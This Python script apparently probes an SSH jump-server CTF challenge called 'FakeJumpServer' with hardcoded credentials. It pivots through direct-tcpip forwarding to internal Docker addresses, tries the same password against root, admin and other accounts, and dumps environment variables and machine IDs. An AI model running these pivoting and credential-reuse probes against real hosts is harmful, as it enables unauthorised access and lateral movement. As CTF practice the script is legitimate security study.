import paramiko
import socket
import time
import sys

"""
关键发现！！！

当使用ProxyJump时：
1. 连接到61.147.171.105:55300 -> dropbear
2. 请求转发到localhost:22
3. dropbear返回的host key是自己的！

这意味着dropbear没有真正转发到另一个SSH服务器，
而是自己处理了这个连接！

这就是FakeJumpServer的核心：
- 跳板机伪装成目标服务器
- 我们发送的认证信息被跳板机捕获

但172.17.0.1返回的host key不同，说明那是真正的连接

问题是：
1. 如何获取172.17.0.1的凭据？
2. 是否有某种方式可以利用这种"伪装"行为？

让我思考一下...
如果dropbear会拦截到localhost的请求，并用我们发送的凭据认证，
那么它一定在某处保存了凭据配置...

或者，如果我们能让dropbear用错误的方式处理请求，
可能可以泄露信息或绕过某些检查
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def test_special_hostnames():
    """测试特殊的主机名"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 获取dropbear的host key作为参考
    dropbear_key = transport.get_remote_server_key()
    print(f"Dropbear host key: {dropbear_key.get_fingerprint().hex()}")
    
    # 测试各种特殊地址
    special_hosts = [
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0",
        "host",
        "docker",
        "host.docker.internal",
        "gateway.docker.internal",
        "10.0.2.2",
        "10.0.2.15",
        "172.17.0.1",
        "172.17.0.2",
    ]
    
    for host in special_hosts:
        print(f"\n测试 {host}:22...")
        try:
            channel = transport.open_channel("direct-tcpip", (host, 22), ('127.0.0.1', 0), timeout=5)
            
            # 读取banner
            banner = b""
            try:
                channel.settimeout(3)
                banner = channel.recv(100)
            except:
                pass
            
            if not banner:
                print(f"  无响应")
                continue
            
            print(f"  Banner: {banner[:60]}")
            
            # 重新连接并获取host key
            channel.close()
            channel = transport.open_channel("direct-tcpip", (host, 22), ('127.0.0.1', 0), timeout=5)
            
            try:
                t = paramiko.Transport(channel)
                t.start_client()
                key = t.get_remote_server_key()
                
                same = key.get_fingerprint() == dropbear_key.get_fingerprint()
                print(f"  Host key: {key.get_fingerprint().hex()}")
                print(f"  与dropbear相同: {same}")
                
                t.close()
            except Exception as e:
                print(f"  SSH握手错误: {e}")
            
        except Exception as e:
            print(f"  连接错误: {e}")
    
    ssh.close()

def test_password_reuse():
    """
    测试密码重用
    
    如果dropbear"伪装"成localhost，那么它应该接受我们的凭据
    问题是：它会对所有用户都接受吗？
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试密码重用...")
    
    # 测试不同用户名
    users = ["ctf", "root", "admin", "ubuntu", "flag"]
    
    for user in users:
        print(f"\n测试用户 {user}:")
        
        # 连接到localhost
        channel = transport.open_channel("direct-tcpip", ("localhost", 22), ('127.0.0.1', 0))
        t = paramiko.Transport(channel)
        t.start_client()
        
        # 尝试用相同的密码
        try:
            t.auth_password(user, PASSWD)
            print(f"  用户 {user} 认证成功!")
            
            # 检查我们是否真的是这个用户
            session = t.open_session()
            session.exec_command("id; printenv USER")
            result = session.recv(1024).decode()
            print(f"  输出: {result}")
            
        except paramiko.AuthenticationException:
            print(f"  用户 {user} 认证失败")
        except Exception as e:
            print(f"  错误: {e}")
        finally:
            t.close()
    
    ssh.close()

def test_environment_differences():
    """
    比较直接连接和通过ProxyJump连接的环境差异
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 比较环境差异...")
    
    # 直接连接的环境
    print("\n直接连接:")
    session = transport.open_session()
    session.exec_command("printenv; cat /etc/machine-id 2>/dev/null; cat /run/host/container-uuid 2>/dev/null")
    result1 = session.recv(4096).decode()
    print(result1)
    
    # 通过localhost连接的环境
    print("\n通过localhost连接:")
    channel = transport.open_channel("direct-tcpip", ("localhost", 22), ('127.0.0.1', 0))
    t = paramiko.Transport(channel)
    t.start_client()
    t.auth_password(USER, PASSWD)
    
    session2 = t.open_session()
    session2.exec_command("printenv; cat /etc/machine-id 2>/dev/null; cat /run/host/container-uuid 2>/dev/null")
    result2 = session2.recv(4096).decode()
    print(result2)
    
    t.close()
    ssh.close()
    
    # 比较UUID
    print("\n差异分析:")
    if "container_uuid" in result1:
        uuid1 = [line for line in result1.split('\n') if 'container_uuid' in line.lower()][0] if any('container_uuid' in line.lower() for line in result1.split('\n')) else "未找到"
        uuid2 = [line for line in result2.split('\n') if 'container_uuid' in line.lower()][0] if any('container_uuid' in line.lower() for line in result2.split('\n')) else "未找到"
        print(f"直接连接UUID: {uuid1}")
        print(f"通过localhost UUID: {uuid2}")

def test_172_17_0_1_directly():
    """
    直接测试172.17.0.1
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试172.17.0.1...")
    
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    t = paramiko.Transport(channel)
    t.start_client()
    
    print(f"远程版本: {t.remote_version}")
    
    # 获取支持的认证方法
    try:
        t.auth_none("root")
    except paramiko.BadAuthenticationType as e:
        print(f"支持的认证方法: {e.allowed_types}")
    
    t.close()
    
    # 重新连接并尝试ctf凭据
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    t = paramiko.Transport(channel)
    t.start_client()
    
    try:
        t.auth_password("ctf", "123456")
        print("[+] ctf:123456 在172.17.0.1上成功!")
        
        session = t.open_session()
        session.exec_command("id; hostname")
        print(session.recv(1024).decode())
    except paramiko.AuthenticationException:
        print("[-] ctf:123456 在172.17.0.1上失败")
    
    t.close()
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] FakeJumpServer利用尝试")
    print("="*60)
    
    print("\n[1] 测试特殊主机名")
    test_special_hostnames()
    
    print("\n[2] 测试密码重用")
    test_password_reuse()
    
    print("\n[3] 测试环境差异")
    test_environment_differences()
    
    print("\n[4] 测试172.17.0.1")
    test_172_17_0_1_directly()
